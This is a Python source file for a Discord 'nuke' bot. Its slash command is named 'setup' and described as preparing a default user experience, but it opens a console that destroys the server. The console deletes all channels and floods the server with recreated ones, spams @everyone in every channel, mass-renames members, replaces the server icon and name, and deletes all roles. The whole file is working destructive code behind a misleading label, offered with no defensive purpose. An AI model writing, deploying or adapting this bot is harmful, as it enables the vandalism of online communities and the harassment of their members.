import discord
from discord.ext import commands
import requests

TOKEN = 'YOUR_TOKEN_HERE'

intents = discord.Intents.all()
bot = commands.Bot(intents=intents)

class colors:
  GREEN = '\x1b[32m'
  ENDC = '\033[0m'
  BOLD = '\033[1m'

@bot.event
async def on_ready():
  print(f'Logged in as {bot.user}')


@bot.slash_command(name="setup", description='Prepares the bot with the default user experience')
async def setup(ctx):
  print("Commands: \nremoveall - removes all channels and replaces them\nspam - sends a message with @everyone appended \nnick - nicks all users with an input \nicon - replaces the icon and name of the server \nrole - removes all available roles")
  while True:
    command = input(f"{colors.BOLD}{colors.GREEN}{ctx.guild.id}{colors.ENDC} > ")
    
    
    if (command == "removeall"):
      channelName = input("  Channel Name: ")
      for channel in ctx.guild.channels:
        await channel.delete()

      for lp in range(100):
        try:
          await ctx.guild.create_text_channel(channelName)
        except:
          if not (channelName == " "):
            print(f"{colors.BOLD}{colors.GREEN}{ctx.guild.id}{colors.ENDC} > Failed Create")

    
    if (command == "spam"):
      message = input(  "Message: ")
      spamAmountString = input("  Messages per Channel: ")
      spamAmount = int(spamAmountString)
      for lp in range(spamAmount):
        for channel in ctx.guild.channels:
          try:
            await channel.send(message + "@everyone")
          except:
            print(f"{colors.BOLD}{colors.GREEN}{ctx.guild.id}{colors.ENDC} > Failed Send")

    if (command == "icon"):
      icon = input("  Icon Link: ") # https://townsquare.media/site/40/files/2017/03/Dog-.jpg?w=1200&h=0&zc=1&s=0&a=t&q=89
      name = input("  New Name: ")
      response = requests.get(icon)
      image_data = response.content
      try:
        await ctx.guild.edit(icon=image_data)
        await ctx.guild.edit(name=name)
      except:
        print(f"{colors.BOLD}{colors.GREEN}{ctx.guild.id}{colors.ENDC} > Failed Edit")

    if (command == "nick"):
      nickName = input(" New Nickname: ")
      for member in ctx.guild.members:
        try:
          await member.edit(nick=nickName)
        except:
          print(f"{colors.BOLD}{colors.GREEN}{ctx.guild.id}{colors.ENDC} > Failed nickname")

    if (command == "role"):
      for role in ctx.guild.roles:  
        try:  
          await role.delete()
          print(f"{colors.BOLD}{colors.GREEN}{ctx.guild.id}{colors.ENDC} > Deleted {role.name}")
        except:
          print(f"{colors.BOLD}{colors.GREEN}{ctx.guild.id}{colors.ENDC} > Cannot Delete {role.name}")

try:
  bot.run(TOKEN)
except:
  print("Invalid token. Please replace TOKEN='YOUR_TOKEN_HERE' with your bots token.")
